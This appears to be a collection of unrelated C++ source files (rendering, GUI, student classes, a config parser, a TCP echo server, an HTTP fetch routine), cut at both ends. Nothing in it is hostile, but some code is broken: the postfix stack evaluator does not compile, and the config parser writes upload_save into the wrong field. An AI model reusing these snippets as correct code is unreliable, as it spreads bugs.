url.c_str(), INTERNET_DEFAULT_HTTP_PORT, 0);\n\n            if (hConnection) {\n                HINTERNET hRequete = WinHttpOpenRequest(hConnection, L\"GET\", chemin, NULL,\n                    WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);\n\n                if (hRequete) {\n                    BOOL bResults = WinHttpSendRequest(hRequete, WINHTTP_NO_ADDITIONAL_HEADERS,\n                        0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);\n\n                    if (bResults) {\n                        bResults = WinHttpReceiveResponse(hRequete, NULL);\n                    }\n\n                    if (bResults) {\n                        DWORD dwSize = 0;\n                        DWORD dwDownloaded = 0;\n                        std::vector<char> buffer;\n\n                        do {\n                            if (!WinHttpQueryDataAvailable(hRequete",
    "#include \"surtidor.h\"\r\n#include <iostream>\r\n\r\nSurtidor::Surtidor() : codigo(0), modelo(\"\"), activo(false), numeroTransacciones(0) {}\r\n\r\nSurtidor::Surtidor(int cod, string mod) : codigo(cod), modelo(mod), activo(true), numeroTransacciones(0) {}\r\n\r\nint Surtidor::getCodigo() const { return codigo; }\r\nstring Surtidor::getModelo() const { return modelo; }\r\nbool Surtidor::isActivo() const { return activo; }\r\n\r\nint Surtidor::getNumeroTransacciones() const {\r\n    return numeroTransacciones;\r\n}\r\n\r\nconst Transaccion& Surtidor::getTransaccion(int index) const {\r\n    if (index < 0 || index >= numeroTransacciones) {\r\n        throw std::out_of_range(\"\u00cdndice fuera de rango.\");\r\n    }\r\n    return historicoTransacciones[index];\r\n}\r\n\r\nvoid Surtidor::activar() { activo = true; }\r\nvoid Surtidor::desactivar() { activo = false; }\r\n\r\nvoid Surtidor::registrarTransaccion(const Transaccion& transaccion) {\r\n    if (numeroTransacciones < 100) {\r\n        historicoTransacciones[numeroTransacciones++] = transaccion;\r\n    } else {\r\n        std::cout << \"L\u00edmite de transacciones alcanzado.\" << std::endl;\r\n    }\r\n}\r\n\r\nvoid Surtidor::mostrarHistorico() const {\r\n    for (int i = 0; i < numeroTransacciones; ++i) {\r\n        historicoTransacciones[i].mostrarDetalles();\r\n        std::cout << \"-------------------\" << std::endl;\r\n    }\r\n}\r\n\r\nvoid Surtidor::calcularVentasPorCategoria(float& totalRegular, float& totalPremium, float& totalEcoExtra) const {\r\n    for (int i = 0; i < numeroTransacciones; ++i) {\r\n        string categoria = historicoTransacciones[i].getCategoria();\r\n        float monto = historicoTransacciones[i].getMonto();\r\n\r\n        if (categoria == \"Regular\") {\r\n            totalRegular += monto;\r\n        } else if (categoria == \"Premium\") {\r\n            totalPremium += monto;\r\n        } else if (categoria == \"EcoExtra\") {\r\n            totalEcoExtra += monto;\r\n        }\r\n    }\r\n}\r\n",
    "/*\n    This file is part of Magnum.\n\n    Copyright \u00a9 2010, 2011, 2012, 2013, 2014, 2015, 2016, 2017, 2018, 2019,\n                2020, 2021 Vladim\u00edr Vondru\u0161 <mosra@centrum.cz>\n\n    Permission is hereby granted, free of charge, to any person obtaining a\n    copy of this software and associated documentation files (the \"Software\"),\n    to deal in the Software without restriction, including without limitation\n    the rights to use, copy, modify, merge, publish, distribute, sublicense,\n    and/or sell copies of the Software, and to permit persons to whom the\n    Software is furnished to do so, subject to the following conditions:\n\n    The above copyright notice and this permission notice shall be included\n    in all copies or substantial portions of the Software.\n\n    THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n    IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n    FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL\n    THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n    LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING\n    FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER\n    DEALINGS IN THE SOFTWARE.\n*/\n\n#include \"AbstractObject.h\"\n\n#include <Corrade/Utility/Assert.h>\n#include <Corrade/Containers/ArrayView.h>\n\n#include \"Magnum/GL/Context.h\"\n#include \"Magnum/GL/Extensions.h\"\n#include \"Magnum/GL/Implementation/State.h\"\n#ifndef MAGNUM_TARGET_WEBGL\n#include \"Magnum/GL/Implementation/DebugState.h\"\n#endif\n\nnamespace Magnum { namespace GL {\n\n#ifndef MAGNUM_TARGET_WEBGL\nnamespace {\n    inline GLenum extTypeFromKhrIdentifier(GLenum khrIdentifier) {\n        switch(khrIdentifier) {\n            #ifndef MAGNUM_TARGET_GLES2\n            case GL_BUFFER:\n            #else\n            case GL_BUFFER_KHR:\n            #endif\n                return GL_BUFFER_OBJECT_EXT;\n\n            #ifndef MAGNUM_TARGET_GLES2\n            case GL_SHADER:\n            #else\n            case GL_SHADER_KHR:\n            #endif\n                return GL_SHADER_OBJECT_EXT;\n\n            #ifndef MAGNUM_TARGET_GLES2\n            case GL_PROGRAM:\n            #else\n            case GL_PROGRAM_KHR:\n            #endif\n                return GL_PROGRAM_OBJECT_EXT;\n\n            #ifndef MAGNUM_TARGET_GLES2\n            case GL_VERTEX_ARRAY:\n            #else\n            case GL_VERTEX_ARRAY_KHR:\n            #endif\n                return GL_VERTEX_ARRAY_OBJECT_EXT;\n\n            #ifndef MAGNUM_TARGET_GLES2\n            case GL_QUERY:\n            #else\n            case GL_QUERY_KHR:\n            #endif\n                return GL_QUERY_OBJECT_EXT;\n\n            /** @todo Why isn't `GL_PROGRAM_PIPELINE_KHR` in ES's KHR_debug? */\n            #ifndef MAGNUM_TARGET_GLES2\n            case GL_PROGRAM_PIPELINE:\n            #else\n            case 0x82E4: //GL_PROGRAM_PIPELINE_KHR:\n            #endif\n                return GL_PROGRAM_PIPELINE_OBJECT_EXT;\n\n            /**\n             * @todo Shouldn't ES2's KHR_debug have `GL_TRANSFORM_FEEDBACK_KHR`\n             *      instead of `GL_TRANSFORM_FEEDBACK`? (it's a new enum in 2.0)\n             *      Also the original @gl_extension{EXT,debug_label} mentions it\n             *      only for ES3 (i.e. no mention of @gl_extension{EXT,transform_feedback})\n             */\n            case GL_TRANSFORM_FEEDBACK:\n            #ifndef MAGNUM_TARGET_GLES2\n            case GL_SAMPLER:\n            #else\n            case GL_SAMPLER_KHR:\n            #endif\n            case GL_TEXTURE:\n            case GL_RENDERBUFFER:\n            case GL_FRAMEBUFFER:\n                return khrIdentifier;\n        }\n\n        CORRADE_INTERNAL_ASSERT_UNREACHABLE(); /* LCOV_EXCL_LINE */\n    }\n}\n\nInt AbstractObject::maxLabelLength() {\n    if(!Context::current().isExtensionSupported<Extensions::KHR::debug>())\n        return 0;\n\n    GLint& value = Context::current().state().debug.maxLabelLength;\n\n    if(value == 0) {\n        #ifndef MAGNUM_TARGET_GLES2\n        glGetIntegerv(GL_MAX_LABEL_LENGTH, &value);\n        #else\n        glGetIntegerv(GL_MAX_LABEL_LENGTH_KHR, &value);\n        #endif\n    }\n\n    return value;\n}\n\nvoid AbstractObject::labelImplementationNoOp(GLenum, GLuint, Containers::ArrayView<const char>) {}\n\n#ifndef MAGNUM_TARGET_GLES2\nvoid AbstractObject::labelImplementationKhrDesktopES32(const GLenum identifier, const GLuint name, const Containers::ArrayView<const char> label) {\n    glObjectLabel(identifier, name, label.size(), label);\n}\n#endif\n\n#ifdef MAGNUM_TARGET_GLES\nvoid AbstractObject::labelImplementationKhrES(const GLenum identifier, const GLuint name, const Containers::ArrayView<const char> label) {\n    glObjectLabelKHR(identifier, name, label.size(), label);\n}\n#endif\n\nvoid AbstractObject::labelImplementationExt(const GLenum identifier, const GLuint name, const Containers::ArrayView<const char> label) {\n    const GLenum type = extTypeFromKhrIdentifier(identifier);\n    glLabelObjectEXT(type, name, label.size(), label);",
    "#include <iostream>\n#include <vector>\n#include \"ressource.h\"\n#include \"humaine.h\"\n#include \"investisseur.h\"\n\nusing namespace std;\n\nMentor::Mentor(){}\n\nMentor::Mentor(int id, string nom, string date, string expertise, int nbPers, int session)\n    : Humaine(id, nom, date, expertise, nbPers), nombreSessions(session) {\n    if (nombreSessions > 0) {\n        this->session = new string[nombreSessions];\n        for (int i = 0; i < nombreSessions; ++i) {\n            cout << \"Session \" << i + 1 << \" : \";\n            cin >> this->session[i];\n        }\n    }\n}\n\nMentor::~Mentor() {\n    delete[] session;\n}\n\nvoid Mentor::afficherRessource() {\n    Humaine::afficherRessource();\n    cout << \"Nombre de sessions de mentorat : \" << nombreSessions << endl;\n    if (nombreSessions > 0) {\n        cout << \"Sessions :\" << endl;\n        for (int i = 0; i < nombreSessions; ++i) {\n            cout << \"- \" << session[i] << endl;\n        }\n    }\n}\n\nistream& operator>>(istream& in ,Mentor& m)\n{\n    Humaine *h=&m;\n    in>>*h;\n    cout << \"Nombre de sessions de mentorat : \";\n    in >> m.nombreSessions;\n    if (m.nombreSessions > 0) {\n        m.session = new string[m.nombreSessions];\n        for (int i = 0; i < m.nombreSessions; ++i) {\n            cout << \"Session \" << i + 1 << \" : \";\n            in >> m.session[i];\n        }\n    }\n    return in;\n}\n\nvoid Mentor::afficherSessions() {\n    cout << \"Sessions :\" << endl;\n    for (int i = 0; i < nombreSessions; ++i) {\n        cout << \"- \" << session[i] << endl;\n    }\n}\n\nvoid Mentor::supprimerSession() {\n    if (nombreSessions == 0) {\n        cout << \"Aucune session a supprimer.\" << endl;\n        return;\n    }\n\n    string sessionASupprimer;\n    cout << \"Entrez le nom de la session a supprimer : \";\n    cin >> sessionASupprimer;\n\n    bool trouve = false;\n    for (int i = 0; i < nombreSessions; ++i) {\n        if (session[i] == sessionASupprimer) {\n            trouve = true;\n            for (int j = i; j < nombreSessions - 1; ++j) {\n                session[j] = session[j + 1];\n            }\n            nombreSessions--;\n            break;\n        }\n    }\n\n    if (!trouve) {\n        cout << \"La session specifiee n'a pas ete trouvee.\" << endl;\n    }\n}\n\n void Mentor::afficherTitre()  {\n        cout << \"Mentor\" << endl;\n    }\n\n\nMentor::Mentor(const Mentor& m) : Humaine(m) {\n    nombreSessions = m.nombreSessions;\n\n        session = new string[nombreSessions];\n        for (int i = 0; i < nombreSessions; ++i) {\n            session[i] = m.session[i];\n        }\n}\n\nMentor& Mentor::operator=(const Mentor& m) {\n\n    if (this != &m) {\n        Humaine::operator=(m);\n        nombreSessions = m.nombreSessions;\n            session = new string[nombreSessions];\n            for (int i = 0; i < nombreSessions; ++i) {\n                session[i] = m.session[i];\n        }\n    }\n    return *this;\n}\n\n\n",
    "#include<iostream>\r\nusing namespace std;\r\nclass Stack\r\n{\r\n public:\r\n   int top=-1;\r\n   int n[100];\r\n   void push(int x)\r\n   {\r\n      n[++top]=x;\r\n   }\r\n\r\n   void pop()\r\n   {\r\n      top=top-1;\r\n   }\r\n   void check(int len,string str)\r\n   {\r\n    for(int i=0;i<len;i++)\r\n    {\r\n       char c3=str[i];\r\n       if(c3==' ')\r\n        continue;\r\n        else if(c3=='+'||c3=='-'||c3=='*'||c3=='/')\r\n        {\r\n           int op2=n[top];\r\n           n.pop();\r\n           int op1=n[top];\r\n           n.pop();\r\n           int res=evaluate(c3,op1,op2);\r\n           n.push(res);\r\n        }\r\n        else if(c3>='0'&&c3<='9')\r\n        {\r\n            n.push(c3);\r\n        }\r\n    }\r\n    cout<<n[top];\r\n    }\r\n    int evaluate(char c3,int op1,int op2)\r\n    {\r\n       if(c3=='+')\r\n         return op1+op2;\r\n    else if(c3=='-')\r\n    {\r\n          return op1-op2;\r\n    }\r\n    else if(c3=='*')\r\n    {\r\n       return op1*op2;\r\n    }\r\n    else if(c3=='/')\r\n    {\r\n        return op1/op2;\r\n     }\r\n    }\r\n};\r\nint main()\r\n{\r\n    Stack s;\r\n    string str;\r\n    cout<<\"Enter a string:\\n\";\r\n    getline(cin,str)\r\n    int len=str.length();\r\n     s.check(len,str);\r\n    return 0;\r\n}\r\n",
    "/* -*- mode: C++ ; c-file-style: \"stroustrup\" -*- *****************************\n * Qwt Widget Library\n * Copyright (C) 1997   Josef Wilgen\n * Copyright (C) 2002   Uwe Rathmann\n *\n * This library is free software; you can redistribute it and/or\n * modify it under the terms of the Qwt License, Version 1.0\n *****************************************************************************/\n\n#include \"qwt_point_mapper.h\"\n#include \"qwt_scale_map.h\"\n#include \"qwt_pixel_matrix.h\"\n#include <qpolygon.h>\n#include <qimage.h>\n#include <qpen.h>\n#include <qpainter.h>\n\n#if QT_VERSION >= 0x040400\n\n#include <qthread.h>\n#include <qfuture.h>\n#include <qtconcurrentrun.h>\n\n#if !defined(QT_NO_QFUTURE)\n#define QWT_USE_THREADS 0\n#endif\n\n#endif\n\nstatic QRectF qwtInvalidRect( 0.0, 0.0, -1.0, -1.0 );\n\n// Helper class to work around the 5 parameters\n// limitation of QtConcurrent::run()\nclass QwtDotsCommand\n{\npublic:\n    const QwtSeriesData<QPointF> *series;\n    int from;\n    int to;\n    QRgb rgb;\n};\n\nstatic void qwtRenderDots(\n    const QwtScaleMap &xMap, const QwtScaleMap &yMap,\n    const QwtDotsCommand command, const QPoint &pos, QImage *image ) \n{\n    const QRgb rgb = command.rgb;\n    QRgb *bits = reinterpret_cast<QRgb *>( image->bits() );\n\n    const int w = image->width();\n    const int h = image->height();\n\n    const int x0 = pos.x();\n    const int y0 = pos.y();\n\n    for ( int i = command.from; i <= command.to; i++ )\n    {\n        const QPointF sample = command.series->sample( i );\n\n        const int x = static_cast<int>( xMap.transform( sample.x() ) + 0.5 ) - x0;\n        const int y = static_cast<int>( yMap.transform( sample.y() ) + 0.5 ) - y0;\n\n        if ( x >= 0 && x < w && y >= 0 && y < h )\n            bits[ y * w + x ] = rgb;\n    }\n}\n\nstatic inline int qwtRoundValue( double value )\n{\n    return qRound( value );\n}\n\n// some functors, so that the compile can inline\nstruct QwtRoundI\n{\n    inline int operator()( double value )\n    {\n        return qwtRoundValue( value );\n    }\n};\n\nstruct QwtRoundF\n{\n    inline double operator()( double value )\n    {\n#if 1\n        // MS Windows and at least IRIX does not have C99's nearbyint() function\n        return ( value >= 0.0 ) ? ::floor( value + 0.5 ) : ::ceil( value - 0.5 );\n#else\n        // slightly faster than the code above\n        return nearbyint( value );\n#endif\n    }\n};\n\nstruct QwtNoRoundF\n{   \n    inline double operator()( double value )\n    {\n        return value;\n    }\n};\n\n// mapping points without any filtering - beside checking\n// the bounding rectangle\n\ntemplate<class Polygon, class Point, class Round>\nstatic inline Polygon qwtToPoints( \n    const QRectF &boundingRect,\n    const QwtScaleMap &xMap, const QwtScaleMap &yMap,\n    const QwtSeriesData<QPointF> *series, \n    int from, int to, Round round )\n{\n    Polygon polyline( to - from + 1 );\n    Point *points = polyline.data();\n\n    int numPoints = 0;\n\n    if ( boundingRect.isValid() )\n    {\n        // iterating over all values\n        // filtering out all points outside of\n        // the bounding rectangle\n\n        for ( int i = from; i <= to; i++ )\n        {\n            const QPointF sample = series->sample( i );\n\n            const double x = xMap.transform( sample.x() );\n            const double y = yMap.transform( sample.y() );\n\n            if ( boundingRect.contains( x, y ) )\n            {\n                points[ numPoints ].rx() = round( x );\n                points[ numPoints ].ry() = round( y );\n\n                numPoints++;\n            }\n        }\n\n        polyline.resize( numPoints );\n    }\n    else\n    {\n        // simply iterating over all values\n        // without any filtering\n\n        for ( int i = from; i <= to; i++ )\n        {\n            const QPointF sample = series->sample( i );\n\n            const double x = xMap.transform( sample.x() );\n            const double y = yMap.transform( sample.y() );\n\n            points[ numPoints ].rx() = round( x );\n            points[ numPoints ].ry() = round( y );\n\n            numPoints++;\n        }\n    }\n\n    return polyline;\n}\n\nstatic inline QPolygon qwtToPointsI(\n    const QRectF &boundingRect,\n    const QwtScaleMap &xMap, const QwtScaleMap &yMap,\n    const QwtSeriesData<QPointF> *series,\n    int from, int to )\n{\n    return qwtToPoints<QPolygon, QPoint>( \n        boundingRect, xMap, yMap, series, from, to, QwtRoundI() );\n}\n\ntemplate<class Round>\nstatic inline QPolygonF qwtToPointsF(\n    const QRectF &boundingRect,\n    const QwtScaleMap &xMap, const QwtScaleMap &yMap,\n    const QwtSeriesData<QPointF> *series,\n    int from, int to, Round round )\n{\n    return qwtToPoints<QPolygonF, QPointF>( \n        boundingRect, xMap, yMap, series, from, to, round );\n}\n\n// Mapping points with filtering out consecutive\n// points mapped to the same position\n\ntemplate<class Polygon, class Point, class Round>\nstatic inline Polygon qwtToPolylineFiltered( \n    const QwtScaleMap &xMap, const QwtScaleMap &yMap,\n    const QwtSeriesData<QPointF> *series, \n    int from, int to, Round round )\n{\n    // in cur",
    "/***********************************************************************\n\nName --> A - International Justice Day\nLink --> https://vjudge.net/contest/667724#problem/A\n\nExample-->\n\n\n***********************************************************************/\n\n#include <bits/stdc++.h>\nusing namespace std;\n\n#define int long long\n#define endl '\\n'\n#define all(x) (x).begin(), (x).end()\n#define rall(x) (x).rbegin(), (x).rend()\n#define sz(x) ((int)(x).size())\n#define pb push_back\n#define pf push_front\n#define mp make_pair\n#define mt make_tuple\n#define fi first\n#define se second\n#define rep(i, a, b) for (int i = (a); i < (b); ++i)\n#define per(i, a, b) for (int i = (b) - 1; i >= (a); --i)\n#define trav(a, x) for (auto &a : x)\n#define UNIQUE(v) v.erase(unique(all(v)), v.end())\n//********************************************************************\n\nvoid solve()\n{\n    int x, y;\n    cin>>x>>y;\n\n    if (x >= y)\n        cout << \"YES\" << endl;\n    else\n        cout << \"NO\" << endl;\n}\n\nint32_t main()\n{\n    ios::sync_with_stdio(0);\n    cin.tie(0);\n\n    int t = 1;\n    // cin >> t; // Uncomment if multiple test cases\n\n    while (t--)\n    {\n        solve();\n    }\n\n    return 0;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"mi_card\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\n#include \"matrix.hpp\"\nusing namespace std;\n\nint main(void)\n{\n    mvector a(3), b(3), c(3), d(3);\n    matrix A(3, 3), B(3, 3), C(3, 3), D(3, 3), E(3, 3);\n    double result;\n    for (int i = 0; i < 3; i++)\n    {\n        a.elements[i] = i + 1;\n        b.elements[i] = 3 - i;\n        for (int j = 0; j < 3; j++)\n        {\n            A.elements[i][j] = j + 1;\n            B.elements[i][j] = i + 1;\n        }\n    }\n    c = a + b;\n    d = a - b;\n    for (int i = 0; i < 3; i++)\n    {\n        cout << a.elements[i];\n    }\n    cout << endl;\n    for (int i = 0; i < 3; i++)\n    {\n        cout << b.elements[i];\n    }\n    cout << endl;\n    for (int i = 0; i < 3; i++)\n    {\n        cout << c.elements[i];\n    }\n    cout << endl;\n    for (int i = 0; i < 3; i++)\n    {\n        cout << d.elements[i];\n    }\n    cout << endl;\n    cout << a * b << endl;\n    C = A + B;\n    D = A - B;\n    E = A * B;\n    for (int i = 0; i < 3; i++)\n    {\n        for (int j = 0; j < 3; j++)\n        {\n            cout << A.elements[i][j] << \" \";\n        }\n        cout << endl;\n    }\n    for (int i = 0; i < 3; i++)\n    {\n        for (int j = 0; j < 3; j++)\n        {\n            cout << B.elements[i][j] << \" \";\n        }\n        cout << endl;\n    }\n    for (int i = 0; i < 3; i++)\n    {\n        for (int j = 0; j < 3; j++)\n        {\n            cout << C.elements[i][j] << \" \";\n        }\n        cout << endl;\n    }\n    for (int i = 0; i < 3; i++)\n    {\n        for (int j = 0; j < 3; j++)\n        {\n            cout << D.elements[i][j] << \" \";\n        }\n        cout << endl;\n    }\n    for (int i = 0; i < 3; i++)\n    {\n        for (int j = 0; j < 3; j++)\n        {\n            cout << E.elements[i][j] << \" \";\n        }\n        cout << endl;\n    }\n    return 0;\n}",
    "#include \"Config.hpp\"\n\nConfig::Config() {}\nConfig::~Config() {}\n\nvoid Config::fillEmptyFields(t_cluster_config &cluster) {\n\tfor (std::vector<t_server_config>::iterator it = cluster.servers.begin(); it != cluster.servers.end(); ++it) {\n\t\tt_server_config&\tserver = *it;\n\t\tif (server.port.empty())\n\t\t\tthrow std::invalid_argument(\"Server listen field must be set\");\n\n\t\tif (server.server_name.empty())\n\t\t\tserver.server_name = \"webserv.com\";\n\t\tif (server.client_max_body_size == -1)\n\t\t\tserver.client_max_body_size = 1073741824;\n\t\tif (server.error_pages.find(400) == server.error_pages.end())\n\t\t\tserver.error_pages[400] = \"./web/errors/400.html\";\n\t\tif (server.error_pages.find(403) == server.error_pages.end())\n\t\t\tserver.error_pages[403] = \"./web/errors/403.html\";\n\t\tif (server.error_pages.find(404) == server.error_pages.end())\n\t\t\tserver.error_pages[404] = \"./web/errors/404.html\";\n\t\tif (server.error_pages.find(405) == server.error_pages.end())\n\t\t\tserver.error_pages[405] = \"./web/errors/405.html\";\n\t\tif (server.error_pages.find(413) == server.error_pages.end())\n\t\t\tserver.error_pages[413] = \"./web/errors/413.html\";\n\t\tif (server.error_pages.find(423) == server.error_pages.end())\n\t\t\tserver.error_pages[423] = \"./web/errors/423.html\";\n\t\tif (server.error_pages.find(500) == server.error_pages.end())\n\t\t\tserver.error_pages[500] = \"./web/errors/500.html\";\n\t\tif (server.error_pages.find(502) == server.error_pages.end())\n\t\t\tserver.error_pages[502] = \"./web/errors/502.html\";\n\t\tif (server.error_pages.find(504) == server.error_pages.end())\n\t\t\tserver.error_pages[504] = \"./web/errors/504.html\";\n\t\tif (server.error_pages.find(505) == server.error_pages.end())\n\t\t\tserver.error_pages[505] = \"./web/errors/505.html\";\n\t\tif (server.locations.empty())\n\t\t{\n\t\t\tt_location location;\n\t\t\tlocation.path = \"/\";\n\t\t\tlocation.root = \"/pages\";\n\t\t\tlocation.index = \"index.html\";\n\t\t\tlocation.allowed_methods.push_back(\"GET\");\n\t\t\tlocation.allowed_methods.push_back(\"POST\");\n\t\t\tlocation.allowed_methods.push_back(\"DELETE\");\n\t\t\tlocation.cgi_extension = \".py\";\n\t\t\tlocation.upload_save = \"/uploads/\";\n\t\t\tlocation.autoindex = \"off\";\n\t\t} else {\n\t\t\tfor (std::vector<t_location>::iterator ite = server.locations.begin(); ite != server.locations.end(); ++ite) {\n\t\t\t\tt_location &location = *ite;\n\t\t\t\tif (location.path.empty())\n\t\t\t\t\tthrow std::invalid_argument(\"Location path must be set\");\n\t\t\t\tif (location.root.empty())\n\t\t\t\t\tthrow std::invalid_argument(\"Location root must be set\");\n\t\t\t\tif (location.index.empty())\n\t\t\t\t\tlocation.index = \"index.html\";\n\t\t\t\tif (location.allowed_methods.empty()) {\n\t\t\t\t\tlocation.allowed_methods.push_back(\"GET\");\n\t\t\t\t\tlocation.allowed_methods.push_back(\"POST\");\n\t\t\t\t\tlocation.allowed_methods.push_back(\"DELETE\");\n\t\t\t\t}\n\t\t\t\tif (location.cgi_extension.empty())\n\t\t\t\t\tlocation.cgi_extension = \".py\";\n\t\t\t\tif (location.upload_save.empty())\n\t\t\t\t\tlocation.upload_save = \"/uploads/\";\n\t\t\t\tif (location.autoindex.empty())\n\t\t\t\t\tlocation.autoindex = \"on\";\n\n\t\t\t}\n\t\t}\n\t}\n}\n\nt_location Config::parseLocationBlock(std::stringstream &ss) {\n\tt_location\tlocation;\n\tstd::string\tline;\n\n\tlocation.redir_code = -1;\n\n\twhile (std::getline(ss, line)) {\n\t\ttrim(line);\n\t\tif (line.empty())\n\t\t\tcontinue;\n\n\t\telse if (line == \"}\")\n\t\t\treturn location;\n\t\telse if (line[line.size() - 1] != ';')\n\t\t\tthrow std::invalid_argument(\"Parsing error at: \" + line);\n\t\telse if (line.find(\"root \") == 0) {\n\t\t\tif (!location.root.empty())\n\t\t\t\tthrow std::invalid_argument(\"Parsing error: Duplicate at: \" + line);\n\n\t\t\tline = line.substr(5, line.size() - 6);\n\t\t\tif (line.empty())\n\t\t\t\tthrow std::invalid_argument(\"Parsing error: Empty value\");\n\n\t\t\tlocation.root = line;\n\t\t} else if (line.find(\"index \") == 0) {\n\t\t\tif (!location.index.empty())\n\t\t\t\tthrow std::invalid_argument(\"Parsing error: Duplicate at: \" + line);\n\n\t\t\tline = line.substr(6, line.size() - 7);\n\t\t\tif (line.empty())\n\t\t\t\tthrow std::invalid_argument(\"Parsing error: Empty value\");\n\n\t\t\tlocation.index = line;\n\t\t} else if (line.find(\"cgi_extension \") == 0) {\n\t\t\tif (!location.cgi_extension.empty())\n\n\t\t\t\tthrow std::invalid_argument(\"Parsing error: Duplicate at: \" + line);\n\t\t\tline = line.substr(14, line.size() - 15);\n\t\t\tif (line.empty())\n\t\t\t\tthrow std::invalid_argument(\"Parsing error: Empty value\");\n\t\t\tif (line != \".py\" && line != \".php\")\n\t\t\t\tthrow std::invalid_argument(\"Parsing error: Invalid CGI extension: \" + line);\n\n\t\t\tlocation.cgi_extension = line;\n\t\t} else if (line.find(\"upload_save \") == 0) {\n\t\t\tif (!location.upload_save.empty())\n\t\t\t\tthrow std::invalid_argument(\"Parsing error: Duplicate at: \" + line);\n\n\t\t\tline = line.substr(12, line.size() - 13);\n\t\t\tif (line.empty())\n\t\t\t\tthrow std::invalid_argument(\"Parsing error: Empty value\");\n\n\t\t\tlocation.cgi_extension = line;\n\t\t} else if (line.find(\"autoindex \") == 0) {\n\t\t\tif (!location.autoindex.empty())\n\n\t\t\t\tthrow std::invalid_argument(\"Parsing error: Duplicate at: \" + line);\n\t\t\tline = line.substr(10, line.size() - 11);\n\t\t\tif (line.empty())\n\t\t\t\tthrow std::invalid_argument(\"Parsing error: Empty value\");\n\t\t\tif (line != \"on\" && line != \"off\")\n",
    "#include <iostream>\n#include <string.h>\n#include <unistd.h>  // for close()\n#include <arpa/inet.h> // for socket functions\n\nint main() {\n    const char* HOST = \"192.168.1.104\"; // Server's IP address\n    const int PORT = 8080;               // Port to listen on (non-privileged ports are > 1023)\n\n    // Create socket\n    int server_fd = socket(AF_INET, SOCK_STREAM, 0);\n    if (server_fd == -1) {\n        perror(\"Socket creation failed\");\n        return -1;\n    }\n\n    // Define server address\n    sockaddr_in server_addr;\n    server_addr.sin_family = AF_INET;\n    server_addr.sin_addr.s_addr = inet_addr(HOST);\n    server_addr.sin_port = htons(PORT);\n\n    // Bind socket\n    if (bind(server_fd, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {\n        perror(\"Bind failed\");\n        close(server_fd);\n        return -1;\n    }\n\n    // Start listening for connections\n    if (listen(server_fd, 3) < 0) {\n        perror(\"Listen failed\");\n        close(server_fd);\n        return -1;\n    }\n\n    std::cout << \"Server listening on \" << HOST << \":\" << PORT << std::endl;\n\n    while (true) {\n        // Accept a new connection\n        sockaddr_in client_addr;\n        socklen_t addr_len = sizeof(client_addr);\n        int client_fd = accept(server_fd, (struct sockaddr*)&client_addr, &addr_len);\n        if (client_fd < 0) {\n            perror(\"Accept failed\");\n            continue;\n        }\n\n        std::cout << \"Connected by \" << inet_ntoa(client_addr.sin_addr) << std::endl;\n\n        while (true) {\n            char buffer[1024] = {0}; // Buffer to receive data\n            ssize_t bytes_received = recv(client_fd, buffer, sizeof(buffer), 0);\n            if (bytes_received <= 0) {\n                std::cout << \"Connection closed by \" << inet_ntoa(client_addr.sin_addr) << std::endl;\n                break;\n            }\n\n            std::cout << \"Received: \" << buffer << \" from \" << inet_ntoa(client_addr.sin_addr) << std::endl;\n            send(client_fd, buffer, bytes_received, 0); // Echo the received data back to the client\n        }\n\n        close(client_fd); // Close the client socket\n    }\n\n    close(server_fd); // Close the server socket\n    return 0;\n}\n",
    "#include \"VectorBase.h\"\n#include <iostream>\n#include <conio.h>\nint Pos(char ch, const char *str)\t\t\t// \u8fd4\u56de\u6307\u5b9a\u5b57\u7b26ch\u5728\u5b57\u7b26\u4e32str\u4e2d\u7684\u4e0b\u6807\u3002\u4e0d\u5b58\u5728\u65f6\u8fd4\u56de-1\n{\n    for(int i=0; str[i]!='\\0'; i++)\n        if(ch==str[i])\n            return i;\n    return -1;\n}\n\nint Choice(const char *prompt, const char *options=\"\");\t// \u51fd\u6570\u58f0\u660e\nint Choice(const char *prompt, const char *options)\t\t// \u51fd\u6570\u5b9a\u4e49\u3002\u8f93\u51fa\u63d0\u793a\u4fe1\u606fprompt\uff0c\u8f93\u5165\u9009\u62e9\u7684\u5b57\u7b26\u5e76\u8fd4\u56de\u3002\n{\n    int key;\n    cout << prompt << \"{\";\n    for(int i=0; options[i]!='\\0'; i++)\n    {\n        if(' ' < (options[i] & 0x7f) && (options[i] & 0x7f) < 127)\t// \u9009\u9879options\u4e2d\u7684\u53ef\u6253\u5370\u5b57\u7b26\n            cout << options[i] << ' ';\n        else\t\t\t\t\t\t\t\t\t\t\t\t\t\t// \u9009\u9879options\u4e2d\u7684\u90e8\u5206\u63a7\u5236\u5b57\u7b26\n        {\n            